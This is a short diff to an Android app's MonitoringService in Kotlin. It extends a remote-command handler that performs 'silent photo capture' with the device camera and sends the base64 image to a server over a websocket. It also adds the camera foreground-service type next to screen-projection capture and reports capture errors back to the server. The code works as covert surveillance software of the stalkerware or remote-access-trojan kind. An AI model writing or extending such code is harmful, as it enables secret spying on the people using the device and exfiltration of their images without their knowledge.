@@ -154,11 +154,11 @@ class MonitoringService : Service() {
         createNotificationChannel()
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             try {
-                startForeground(
-                    Config.NOTIFICATION_ID,
-                    buildNotification(),
-                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
-                )
+                var types = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                    types = types or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
+                }
+                startForeground(Config.NOTIFICATION_ID, buildNotification(), types)
             } catch (e: Exception) {
                 startForeground(Config.NOTIFICATION_ID, buildNotification())
             }
@@ -309,12 +309,14 @@ class MonitoringService : Service() {
 
     private fun handleTakePhoto(cmdId: String, cameraType: String) {
         Log.i(TAG, "📷 Requesting silent photo capture: $cameraType")
-        CameraCapture.takePhoto(this, cameraType) { base64 ->
+        CameraCapture.takePhoto(this, cameraType) { base64, errorReason ->
             if (base64 != null) {
                 wsManager.sendCameraPhoto(base64, cmdId, cameraType)
                 Log.i(TAG, "✅ Camera photo sent to server ($cameraType)")
             } else {
-                wsManager.sendCommandResult(cmdId, false, "Camera photo capture failed or permission denied")
+                val reason = errorReason ?: "Camera photo capture failed or permission denied"
+                Log.e(TAG, "❌ Camera capture failed: $reason")
+                wsManager.sendCommandResult(cmdId, false, reason)
             }
         }
     }
